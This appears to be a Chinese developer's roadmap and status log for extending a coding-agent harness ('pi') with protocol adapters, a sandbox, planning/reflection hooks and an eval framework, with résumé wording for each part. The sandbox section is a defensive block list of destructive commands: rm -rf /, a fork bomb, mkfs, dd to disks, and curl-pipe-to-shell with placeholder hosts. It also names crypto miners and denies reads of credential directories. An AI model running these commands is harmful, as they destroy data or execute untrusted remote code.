**"为自研极简 coding agent harness (pi) 实现 ACP (Agent Client Protocol) 协议适配层，基于官方 `@agentclientprotocol/sdk@^1.3.0` 同进程嵌入 AgentSession 而非子进程 RPC，把 agent 内部事件流（partial message delta/tool start/output/end）翻译为 ACP `session/update` 流式通知，支持 session 隔离、取消、权限回调、文件系统客户端请求，使 pi 可作为 drop-in coding agent 接入 Zed/JetBrains 等任何遵循 ACP 标准的编辑器，完整协议生命周期通过 in-process e2e 测试验证。"**

> **注**：ACP（Agent Client Protocol）由 Zed 编辑器团队于 2026 年初推出，定位是"AI 编码助手的 LSP"，目前生态尚在早期（Claude Code、Codex CLI 均已推出官方适配器），简历上这是明确的先发信号。

---

## 模块 4：Sandbox 执行层（P1）✅ 已完成

**目标**：防止 agent 意外执行破坏性命令（`rm -rf /`、fork bomb、mkfs 等），并对所有 bash 命令施加 OS 级文件系统 + 网络隔离。

**完成状态**：✅ 已完成 v0.1，位于 [packages/coding-agent/examples/extensions/sandbox/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/sandbox/)，约 470 行。

### 选型决策

路线图最初推荐 microsandbox（microVM 自托管），实际实现时改用 **`@anthropic-ai/sandbox-runtime`（ASRT，Claude Code 官方沙箱运行时）**，原因：
1. **macOS 原生支持**——microsandbox 依赖 Linux KVM/firecracker，开发机（macOS）无法验证；ASRT 使用 macOS 内置 `sandbox-exec`（Seatbelt）、Linux 使用 `bubblewrap`，双平台开箱即用
2. **生产级验证**——ASRT 是 Claude Code 数百万用户在用的沙箱，成熟度高
3. **零 VM 开销**——OS 系统调用级沙箱，不需要启动虚拟机，毫秒级生效
4. **pi 官方已提供基础示例**——在其基础上做增强而非从零写

> 未来若需要强隔离（不可信代码执行、多租户），可以在当前架构上扩展一层 E2B/microsandbox 作为"二级硬沙箱"，通过新增 `BashOperations` 实现切换即可，接口已抽象。

### 双层防御架构

| 层级 | 机制 | 作用 |
|---|---|---|
| **L1 致命命令静态分析** | 正则模式匹配（11 类致命模式） | 在命令进入沙箱**之前**就阻断明显破坏性操作，给出清晰错误消息 |
| **L2 OS 级沙箱** | `@anthropic-ai/sandbox-runtime` 生成 sandbox-exec/bwrap profile，包装命令执行 | 文件系统读写限制、网络出口白名单、进程隔离 |
| **L3 审计日志** | `<agentDir>/sandbox-audit.jsonl` 逐条记录 | 所有命令（含被阻断的）记录时间、cwd、模式、退出码、耗时 |

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **Tool Override 方式** | ✅ 注册同名 `bash` 工具覆盖内置，通过 `createBashTool(ctx.cwd, { operations })` 切换后端 |
| **user_bash 拦截** | ✅ 通过 `pi.on("user_bash")` 同时拦截 CLI 交互模式的 bash 执行 |
| **L1 致命命令拦截** | ✅ 11 类模式：rm -rf/、rm -rf ~、mkfs/fdisk/parted、dd 到块设备、fork bomb、shutdown/reboot/halt、chmod 777 系统目录、重定向到块设备、curl/wget \| sh、xmrig/minerd 等挖矿程序 |
| **智能分段检测** | ✅ 按 `; && \|\|` 分段检测，避免 `grep 'shutdown'` 误报；fork bomb 等含分号的模式单独全命令匹配 |
| **sudo 前缀支持** | ✅ 所有致命命令模式支持可选 `sudo ` 前缀 |
| **L2 OS 沙箱 - 文件系统** | ✅ denyRead：`~/.ssh ~/.aws ~/.gnupg ~/.kube ~/.azure ~/.config/gcloud`；denyWrite：`.env .env.* *.pem *.key id_rsa*`；allowWrite：cwd、/tmp |
| **L2 OS 沙箱 - 网络** | ✅ allowedDomains 白名单（npm/pypi/github/googleapis/docker/microsoft 共 16 个域名）；deniedDomains 默认阻断云元数据 `169.254.169.254`（防止 SSRF 偷凭证） |
| **三模式切换** | ✅ `on`（OS 沙箱启用）/ `audit-only`（初始化失败/非 darwin/linux 时降级，只记录不隔离）/ `off`（`--no-sandbox` 标志，仍然保留 L1 致命拦截+审计） |
| **会话生命周期** | ✅ `session_start` 时 `SandboxManager.initialize(config)`；`session_shutdown` 时 `SandboxManager.reset()`；状态栏显示 `🔒 Sandbox: N domains, M write paths` |
| **JSONL 审计日志** | ✅ 每条记录 ts/command/cwd/mode( blocked-lethal/sandboxed/audit-only/local/error )/exitCode/durationMs/reason；写入 `<agentDir>/sandbox-audit.jsonl` |
| **/sandbox 命令** | ✅ 三个子命令：`/sandbox`（status，显示模式/配置统计/最近 3 条）；`/sandbox log [N]`（查看最近 N 条审计，默认 10）；`/sandbox test`（自检：测试致命过滤器+沙箱状态+审计文件） |
| **--no-sandbox CLI flag** | ✅ `pi -e ./sandbox --no-sandbox` 关闭 OS 沙箱但保留致命拦截+审计 |
| **配置文件** | ✅ 全局 `~/.pi/agent/extensions/sandbox.json` + 项目级 `<cwd>/.pi/sandbox.json` 合并（项目覆盖全局），支持 enabled/blockLethal/network/filesystem 全量配置 |
| **失败降级** | ✅ OS 沙箱初始化失败时自动降级到 audit-only 模式，不中断会话 |
| **E2E 测试** | ✅ [scripts/e2e-test.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/sandbox/scripts/e2e-test.ts)：35 个断言——14 项致命命令阻断、13 项安全命令放行（无误报）、4 项复合命令场景、macOS 上 SandboxManager.initialize/wrapWithSandbox/reset 全流程验证 |

### L1 致命命令拦截覆盖清单

| 命令类型 | 示例 |
|---|---|
| 删除根目录/家目录 | `rm -rf /`、`rm -r -f /`、`sudo rm -rf ~`、`rm -Rf --no-preserve-root /` |
| 磁盘格式化 | `mkfs.ext4 /dev/sda1`、`sudo fdisk /dev/sda`、`parted /dev/sda` |
| 写入块设备 | `dd if=iso of=/dev/sdb bs=4M`、`echo x > /dev/sda` |
| Fork bomb | `:(){ :|:& };:`、文字提及 "fork bomb" |
| 关机/重启 | `shutdown -h now`、`sudo reboot`、`halt`、`init 0`、`telinit 6` |
| chmod 777 系统目录 | `chmod -R 777 /etc`、`sudo chmod 777 ~` |
| curl|sh 远程代码执行 | `curl https://x.com/i.sh \| bash`、`wget -O- http://x \| sudo sh` |
| 挖矿程序 | `xmrig --pool=x`、`minerd`、`cpuminer`、`ccminer`、`ethminer` |

### 简历话术

**"为自研 coding agent harness (pi) 设计实现双层命令沙箱：L1 致命命令静态分析（11 类破坏性模式智能分段检测，避免 grep/echo 误报）+ L2 基于 Anthropic `@anthropic-ai/sandbox-runtime`（Claude Code 同款）的 OS 级 Seatbelt/bubblewrap 沙箱，施加文件系统读写限制、网络出口白名单（含云元数据 SSRF 防护），完整 JSONL 审计日志支持事后溯源，三模式运行（on/audit-only/off）+ 失败自动降级，通过 35 项 e2e 测试覆盖阻断/放行/复合命令场景。"**

---

## 模块 5：Planning & Reflection（P1）✅ 已完成

**目标**：让 agent 在复杂任务前显式建计划、工具失败时触发反思、避免盲目重试死循环。

**完成状态**：✅ 已完成 v0.1，位于 [packages/coding-agent/examples/extensions/plan-reflect/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/plan-reflect/)，约 460 行。

### 理论依据

直接落地两篇经典论文的核心思想，不做花哨变体：

| 能力 | 论文来源 |
|---|---|
| Planning 前置计划 | ReAct (Yao et al., 2022) / Plan-and-Solve (Wang et al., 2023) |
| Reflection 失败反思 | **Reflexion (Shinn et al., NeurIPS 2023)** — 核心 verbal reinforcement 机制 |

### 实现的三个核心机制

**(1) Planning — 任务开始前的计划引导**
- 通过 `before_agent_start` 钩子注入 `display:false` 的隐藏 system prompt（用户无感知）
- 要求 agent 在调用工具前先写"Plan:"标题 + 编号步骤（3-7 步）
- 智能触发：
  - `plan=on`：除极短提示（<5字符）外总是要求计划
  - `plan=auto`（默认）：基于中英文关键词启发式（implement/fix/refactor/实现/修复/重构 等 25 个词）+ 长文本（>120 字符）触发
  - `plan=off`：关闭
- `turn_end` 钩子自动提取 agent 输出中的 Plan 段落保存到状态

**(2) Reflection — 工具错误时的反思引导（Reflexion 核心）**
- 通过 `tool_result` 钩子检测有意义的错误（16 类错误关键词，排除 "0 errors" 等否定语境）
- 不做 block（不打断 agent 循环），而是**替换工具输出内容**，在错误信息前加上反思引导：
  ```
  [REFLECTION — error on attempt 1/2]
  The last `bash` call failed. Before retrying, answer these to yourself:
  - What exactly does the error message say? (read it carefully)
  - What assumption did I make that was wrong?
  - What one concrete thing must I change before trying again?
  Do NOT repeat the exact same call.
  --- Original error ---
  <original error output>
  ```
- 这是 Reflexion 论文的核心机制——不是阻止重试，而是**强制模型在重试前口头分析错误原因**，打破"盲目重试同样错误"的循环。

**(3) 自动重试计数 + 熔断**
- 每个工具目标（bash 命令片段 / 文件路径 / grep pattern）独立计数
- 默认同一目标最多重试 2 次（可配置）
- 超过限制时注入**强停止信号**：
  ```
  [REFLECTION — RETRY LIMIT REACHED (attempt 3/2)]
  STOP retrying this exact approach. You must:
  1. Re-read the relevant files/surrounding context to understand the root cause
  2. Try a fundamentally different strategy
  3. If stuck, explain what you tried and ask the user for help
  ```
- 成功时自动清除该目标的重试计数

### 能力清单

| 能力 | 实现状态 |
|---|---|
| 隐藏式计划注入（display:false，用户无感知） | ✅ |
| 三模式切换：auto / on / off | ✅ |
| 中英文双语关键词启发式（25 个触发词） | ✅ |
| Plan 自动提取 + 状态持久化 | ✅ |
| tool_result 错误语义识别（16 类错误关键词） | ✅ |
| 否定语境排除（"0 errors" / "no errors" 不触发反思） | ✅ |
| Reflexion 式反思提示注入（重试前诊断引导） | ✅ |
| 按工具目标独立重试计数（bash命令/文件路径/grep模式） | ✅ |
| 熔断机制（超过 maxRetries 强制换策略） | ✅ |
| 成功后自动清除重试计数 | ✅ |
| 斜杠命令：/plan [auto\|on\|off]、/reflect [on\|off]、/think | ✅ |
| CLI flags：--plan、--no-reflect | ✅ |
| 状态栏显示：📝 plan:xxx 🔍 reflect 🔄 retries:N | ✅ |
| 状态持久化（appendEntry）+ 会话恢复 | ✅ |
| e2e 测试：46 项断言全部通过 | ✅ |

### 斜杠命令

```bash
/plan             # 查看当前 planning 模式
/plan on          # 总是先做计划
/plan auto        # 智能触发（默认）
/plan off         # 关闭计划

/reflect          # 查看 reflection 状态
/reflect on/off   # 开关错误反思

/think            # 显示当前计划 + 统计（plansGenerated/reflectionsTriggered/retriesBlocked）
```

### E2E 测试覆盖（46 项）

| 测试组 | 断言数 | 覆盖内容 |
|---|---|---|
| 模块加载 | 5 | 导出函数存在、默认配置正确 |
| shouldPlanFor | 16 | off/on/auto 三模式、短提示过滤、8 类英文关键词、3 类中文关键词、长文本触发、只读探索不触发 |
| getToolTarget | 9 | bash/edit/write/read/grep/ls/find/custom 工具的目标提取、截断 |
| isMeaningfulError | 14 | 成功结果、空内容、12 类错误关键词、"0 errors" 否定语境排除、edit 工具错误 |
| TS 动态加载 | 2 | tsx 加载扩展无错误 |

### 简历话术

**"基于 Reflexion (NeurIPS 2023) 和 ReAct 论文实现 Planning-Reflection 认知闭环：在任务开始前通过隐藏 system prompt 注入计划引导（中英文双语智能触发），在工具执行失败时通过 tool_result 钩子以 verbal reinforcement 方式注入反思提示，强制模型在重试前诊断根因而非盲目重试；同时维护按工具目标的重试计数与熔断机制（默认 2 次），超过阈值强制切换策略，避免 agent 陷入无限重试死循环。所有状态通过 session tree 持久化，支持 /plan、/reflect、/think 斜杠命令交互，46 项 e2e 测试覆盖触发启发式、错误语义识别、否定语境排除等边界情况。"**

---

## 模块 6：Agentic Evaluation Framework（P1，`packages/evals`）✅ 已完成 v0.1

**目标**：系统性评估 pi agent 能力，跑 benchmark 出分数/报告，形成"造 agent 也会测 agent"的完整闭环。

**完成状态**：✅ pi 官方已有完整生产级框架（基于 `vitest-evals@0.15.0`），位于 [packages/evals/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/)；补充了 **coding-tasks.eval.ts** 样例展示如何评测实际代码编写任务。

### 意外发现：pi 官方已实现

调研时发现 pi 官方已经在 monorepo 里预置了完整的 `@earendil-works/pi-evals` 包，根 package.json 也已配置好 `npm run eval` 脚本。不需要从零搭建，直接复用即可——完美符合"能参考实现就参考实现"原则。

### 官方框架能力

| 能力 | 实现 |
|---|---|
| **核心架构** | 基于 Sentry 开源的 [`vitest-evals`](https://github.com/getsentry/vitest-evals)，三段式 Harness/Input/Output + Judge 评分模型 |
| **Pi Harness** | [src/pi-harness.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/src/pi-harness.ts) —— 每次 run 创建隔离临时目录（cwd + agentDir），启动真实 `AgentSession`，结束后自动清理 |
| **Artifact 记录** | 自动快照 native Pi session JSONL 到 `.eval/sessions/<runId>.jsonl`，完整轨迹可回放 |
| **Transcript 事件** | 自动把 messages 转为标准化 transcript events（user_message / assistant_message / tool_call / tool_result 含 error） |
| **Usage 统计** | 自动记录 provider/model、inputTokens、outputTokens、totalTokens、toolCalls、cacheRead/Write、estimatedCostUsd |
| **Timing** | 每个 run 记录 totalMs 耗时 |
| **Judge 评分器** | `createJudge()` 定义评分函数，输出 score (0-1) + metadata（rationale 等） |
| **Harness 对比** | [vitest-evals/harness-table.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/src/vitest-evals/harness-table.ts) —— baseline vs candidate 多模型/多配置 A/B 测试，自动计算 pass-rate lift |
| **Reporter** | 自定义 vitest reporter 输出评分汇总 + lift 对比 |
| **Summary** | 测试结束后打印 Markdown 格式 summary 表 |
| **多步 prompt** | 支持 `[{type:"prompt", content}, {type:"reload"}, {type:"prompt", content}]` 序列（创建文件→reload→再 prompt 的场景） |
| **System Prompt 变换** | `transformSystemPrompt` 选项可修改默认系统提示词，方便做 prompt ablation |
| **Model 选择** | 每个 harness 可指定 model `{provider, id}` 覆盖 CLI 默认，便于同任务跑多模型对比 |

### 补充的 eval 样例：coding-tasks.eval.ts

官方已有 smoke.eval.ts（事实问答）和 extensions.eval.ts（扩展编写）两个样例，我补充了：

[coding-tasks.eval.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/src/coding-tasks.eval.ts) —— **实际代码编写任务的 eval 模板**：

1. **任务**：在隔离临时 workspace 里让 agent 写一个 `sum.js` CommonJS 模块，导出 `sum(a,b)` 函数
2. **真实验证**：agent 结束后，eval 端用 `execFileSync` 直接在 Node.js 里 require 产出的文件，跑 4 个测试用例 (2+3=5, -1+1=0, 0+0=0, 100+200=300)
3. **Judge 评分**：SumTaskJudge 检查文件存在 + 所有测试通过，0/1 二元评分，失败时 metadata 记录具体哪个 case 错了
4. **可对比扩展**：代码里预留了 `evalHarnessTable` 用法注释，可快速做 baseline vs with-plan-reflect 的 ablation 研究

这是路线图里说的"hello world eval"：写函数→跑测试→判对错，框架骨架已就位，后续接 SWE-bench/τ-bench 都是按这个模式扩展。

### 运行方式

```bash
# 跑所有 eval（需要设置 provider + model）
cd pi-main
PI_PROVIDER=anthropic PI_MODEL=claude-sonnet-4 npm run eval

# 只跑某一个 eval 文件
npm run eval -- src/coding-tasks.eval.ts

# 跑官方单元测试（验证框架本身，不需要 LLM）
cd packages/evals && npm test    # 23 tests passed
```

### 现有 eval 清单

| 文件 | 评测内容 |
|---|---|
| [smoke.eval.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/src/smoke.eval.ts) | 基础事实问答（capital of France → Paris），验证端到端通路 |
| [extensions.eval.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/src/extensions/extensions.eval.ts) | 扩展编写能力（创建 hello 工具→reload→调用），对比有/无 pi-docs system prompt 的差异（baseline vs candidate A/B） |
| [coding-tasks.eval.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/src/coding-tasks.eval.ts) | 代码编写能力（写 sum.js 并跑 Node.js 测试验证） |

### 后续扩展方向（v0.2+）

v0.1 已验证框架通路通畅，后续可按路线图继续：
1. τ-bench retail 子集接入（工具调用/多轮对话，无需 Docker）
2. SWE-bench Lite 接入（需要 Docker harness，参考 SWE-agent）
3. Regression suite：把前 5 个模块发现的 bug 变成 eval case 持续回归
4. HTML 报告（复用 coding-agent 的 export-html）
5. 并行执行 + trials 重复（多次采样减小方差）

### 简历话术

**"基于 vitest-evals 构建 agentic 评测框架，在独立临时工作目录中启动真实 AgentSession 隔离执行，自动记录 tokens/成本/延迟与完整轨迹 JSONL artifact；实现三段式 Harness/Judge/Transcript 架构，支持多 harness A/B 对比（baseline vs candidate 自动计算 pass-rate lift），覆盖事实问答、扩展编写、代码编写三类任务，代码类任务通过 Node.js 子进程真实执行产出文件并跑测试用例判定，23 项框架单元测试全部通过。"**

---

## 模块 7：A2A 协议（P2）

**目标**：让两个 pi 实例（或 pi 与任何 A2A agent）能互派任务、互传 artifact。

### 参考实现

| 用途 | 仓库 |
|---|---|
| 官方协议 + SDK（Python/TS/Java 都有） | [`google/A2A`](https://github.com/google/A2A)，官网 <https://google.github.io/A2A> |
| Agent Card 规范 | A2A 仓库里的 `agent-card.json` schema + well-known URL 发现 |
| 生态资源 | [`ai-boost/awesome-a2a`](https://github.com/ai-boost/awesome-a2a) |

### 接入点
- 两部分：**(a) pi 作为 A2A Server**（被其他 agent 调用）+ **(b) pi 作为 A2A Client**（调其他 agent）
- **Server**：独立包 `packages/a2a-server`，和 ACP server 类似——起 HTTP 服务，暴露 `/.well-known/agent-card.json` 和 `/tasks/send`、`/tasks/get` 等 JSON-RPC 端点
- **Client**：extension `extensions/a2a`，注册工具 `a2a_delegate(agentUrl, task)` 让 pi 主 agent 可以把子任务派给别的 A2A agent（参考 pi 自带的 [handoff.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/handoff.ts)）
- 关键映射：A2A Task lifecycle (submitted → working → input-required → completed) ↔ pi session lane 状态（参考 harness-v2 lanes 设计）

### 实现步骤
1. 起个最小 A2A server：暴露 agent card（名字、能力描述、skills、输入模态），接受简单文本 task 返回文本 reply
2. 把 task 接到 pi client：收到 task → send prompt 给本地 pi session → 把事件流转成 A2A TaskStatusUpdateEvent
3. 实现 Push Notification / streaming
4. 做 client 侧工具：通过 A2A 发现 agent（读 well-known card）→ 发任务 → 等结果
5. Demo：启动两个 pi A2A 节点，一个"researcher"一个"coder"，主 agent 让 researcher 查资料再让 coder 写代码

### 验收
- 用 A2A 官方 sample client 能调起 pi 节点完成任务。
- 简历话术：**"实现 Google A2A 协议双向适配，支持 Agent Card 发现、Task 流式状态推送、artifact 传递，使 pi 可加入异构多 agent 协作网络"**。

---

## 模块 8：Agent Economy 三件套（P2，前沿加分项）

> ⚠️ **成熟度警告**：这部分协议都还在早期草案/社区阶段，不是像 MCP/A2A 那样稳定。简历里要如实写"跟踪/实验性接入"，面试官追问细节不会穿帮。

### 8.1 Agent Identity — 身份认证与授权

**现状校正**：Google **没有**一个独立命名的 "Agent Identity Protocol (AIP)" 官方协议。业界目前是几个组件拼起来的：

| 组件 | 参考 |
|---|---|
| Agent 身份标识 | W3C [Decentralized Identifiers (DIDs)](https://www.w3.org/TR/did-core/) + [Verifiable Credentials](https://www.w3.org/TR/vc-data-model/) |
| Agent Card 身份 | A2A Agent Card schema 里的 `url`/`authentication` 字段（支持 OAuth2、API Key） |
| AP2 里的 Agent 身份 | AP2 规范自带 agent 身份声明（因为支付必须验身份） |
| 具体实现参考 | [`web5-sdk-js`](https://github.com/TBD54566975/web5-js)（Block 公司的 DID/VC JS SDK，直接接）；A2A SDK 的 AgentCard auth 字段 |

**实现路径**：
- Extension `extensions/economy/identity.ts`
- 启动时为 pi 生成本地 DID（存 `~/.pi/identity/`）
- 把 DID + 能力 VC 挂载到 A2A/ACP/AP2 的 agent card 里
- 对外发请求（MCP/A2A/AP2）时用 DID 签名 HTTP header（参照 VC-DI HTTP signature draft）
- 收到请求时校验对方 DID
- 简历话术：**"基于 W3C DID/VC 规范实现 agent 去中心化身份，签名请求、可验证凭证授权，为多 agent 经济交互提供身份基础"**。

### 8.2 AP2 — Agent Payments Protocol 跨 agent 支付

**真实存在**：由 **Google Agentic Commerce 团队**发起（不是社区炒概念），官方中文社区 ap2lab.com，规范开源。

| 用途 | 参考 |
|---|---|
| 协议规范 | AP2 官方仓库（Google Agentic Commerce 发起），<https://ap2lab.com> 中文社区 |
| 接入文章 | InfoQ《探索 Agent Payments Protocol (AP2)：构建智能支付代理的开源方案》 |
| 行业合作 | Visa、Shopify、Stripe 是首批合作方 |

**接入点**：
- Extension `extensions/economy/payment.ts`
- 注册工具 `ap2_request_quote(agentDid, taskDesc, budget)` / `ap2_pay(invoiceId)` / `ap2_accept_payment(invoice)`
- 实现 AP2 的 quote → invoice → payment → receipt 四阶段流程
- 钱包：先用本地 mock 钱包（记录 ledger 到 sqlite），再接测试网（Solana/Polygon）或 Stripe test mode
- 和 A2A 模块联动：A2A delegate 工具在需要付费调用其他 agent 时自动走 AP2 流程（用户确认后支付）

**简历话术**：**"实验性接入 Google Agentic Commerce 团队发起的 AP2 协议，实现 agent 间报价-发票-支付-结算闭环，支持人在回路 (human-in-the-loop) 支付审批"**。

### 8.3 Agent Discovery — Agent 能力注册与发现

**现状校正**：目前没有独立的"ADP"协议。Discovery 功能被三个现有机制承载：

| 机制 | 参考 |
|---|---|
| MCP Server 发现 | [GitHub MCP Registry](https://github.com/modelcontextprotocol/registry)（事实标准，2026 年 GitHub 官方推出） |
| A2A Agent 发现 | 标准 A2A Agent Card + 企业 registry（A2A 规范里有 extended discovery 章节） |
| 企业私有注册中心 | 多家厂商（Copilot、Bedrock）都在做私有的 agent registry |

**实现路径**：
- Extension `extensions/economy/discovery.ts`
- 对接 MCP Registry API：`pi.registerCommand("/mcp-search <keyword>")` 搜索并一键挂载 MCP server
- 做一个本地 agent registry（sqlite）：把 A2A/ACP agent card 登记进去，提供 `a2a_discover(capability)` 工具
- 可选：把自己的 agent card 发布到本地 registry，形成局域网内 agent 互发现
- 简历话术：**"对接 GitHub MCP Registry + A2A Agent Card discovery 机制，实现 agent 能力的注册、语义检索与一键挂载"**。

---

## 整体实施顺序与时间估算

| 阶段 | 模块 | 难度 | 预计工作量 | 前置依赖 |
|---|---|---|---|---|
| Phase 1 | MCP Client | ⭐⭐ | 3-4 天 | 无 |
| Phase 1 | Memory 系统（文件+向量两层） | ⭐⭐ | 3 天 | 无（可与 MCP 并行） |
| Phase 2 | ACP 适配层 | ⭐⭐⭐ | 4-5 天 | 要先读懂 client 包 |
| Phase 2 | Sandbox | ⭐⭐ | 3 天 | MCP（可选，MCP 形式暴露沙箱） |
| Phase 3 | Planning & Reflection | ⭐⭐⭐ | 4 天 | Memory（沉淀反思） |
| Phase 3 | `packages/evals` 骨架 + SWE-bench Lite | ⭐⭐⭐⭐ | 6-7 天 | 前面全部模块都能被测 |
| Phase 4 | A2A 双向适配 | ⭐⭐⭐ | 4-5 天 | ACP 的经验可复用 |
| Phase 4 | Agent Economy（Identity + AP2 + Discovery） | ⭐⭐⭐⭐ | 7-10 天 | A2A + Memory |

总计约 5-7 周业余工作量，按简历优先级建议至少做到 Phase 3（MCP + Memory + ACP + evals 骨架），这样已经是非常扎实的简历项目。

---

## 简历项目包装建议

**项目名建议**：`pi-forge` 或 `pi-agent-kit`（不是 fork pi，而是以 pi 为 harness 核心的能力扩展套件）。

**一句话描述**：*"基于极简 agent harness (pi-mono) 构建的前沿能力矩阵，覆盖 MCP 2026/ACP/A2A/AP2 协议栈、三层记忆、规划反思闭环、microVM 沙箱与系统化评测框架。"*

**面试重点准备**：
1. 为什么选 pi 而不是 LangChain/CrewAI？（答案：想理解 harness 层最小核心，pi 的 durable session/lanes/deterministic stepping 是最好的教材）
2. MCP 2026-07-28 无状态改了什么？为什么改？
3. ACP vs LSP 的类比；ACP 和 A2A 解决的问题分层
4. Reflexion 论文的 verbal RL 思路，和普通 reflection 的区别
5. SWE-bench 的评测难点在哪（环境准备、patch 验证、oracle tests）
6. 三层记忆为什么这样分？mem0 的 memory decay / 冲突处理怎么做的

**展示素材**（建议在 GitHub README 放）：
- 架构图（pi 核心 + 8 个扩展模块的拓扑）
- MCP 挂载 filesystem server 的 demo gif
- ACP 在 Zed 里调用 pi 的截图
- evals 跑 SWE-bench 的 HTML 报告截图
- 两个 A2A pi 节点对话的 demo 脚本
